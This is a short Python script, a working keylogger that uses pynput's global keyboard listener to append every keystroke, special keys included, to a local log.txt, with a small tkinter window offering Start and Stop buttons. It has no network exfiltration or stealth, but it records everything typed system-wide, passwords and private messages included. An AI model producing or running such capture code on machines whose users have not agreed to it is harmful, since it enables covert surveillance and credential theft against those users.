from pynput import keyboard
import tkinter as tk

keylogger_listener = None  # Global variable to store the keylogger listener instance

def on_press(key):
    try:
        key_char = key.char
        with open('log.txt', 'a') as file:
            file.write(key_char + '\n')
    except AttributeError:
        # Special key encountered, add it to the log file
        key_name = str(key).replace("Key.", "<") + ">"
        with open('log.txt', 'a') as file:
            file.write(key_name + '\n')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the 'esc' key
        return False

def start_keylogger():
    global keylogger_listener
    # Start the keylogger
    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    # Stop the keylogger
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None

# Create a simple GUI
window = tk.Tk()
window.title("Keylogger")
window.geometry("300x150")

start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

window.mainloop()